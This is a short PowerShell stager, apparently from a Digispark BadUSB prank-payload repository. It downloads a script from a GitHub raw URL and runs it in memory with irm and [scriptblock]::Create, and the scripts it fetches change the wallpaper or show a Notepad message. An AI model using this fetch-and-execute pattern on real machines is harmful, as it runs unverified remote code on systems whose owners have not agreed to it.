param(
    [ValidateSet(0,1)]
    [int]$Method = 0
)

$repoBase = "https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main"

$methods = @{
    0 = @{
        Script = "$repoBase/methods/wallpaper_change.ps1"
        Args   = @(
            "$repoBase/assets/images/chungus.jpeg"
        )
    }

    1 = @{
        Script = "$repoBase/methods/notepad_message.ps1"
        Args   = @()
    }
}

if ($methods.ContainsKey($Method)) {
    $config = $methods[$Method]
    & ([scriptblock]::Create((irm $config.Script))) @($config.Args)
}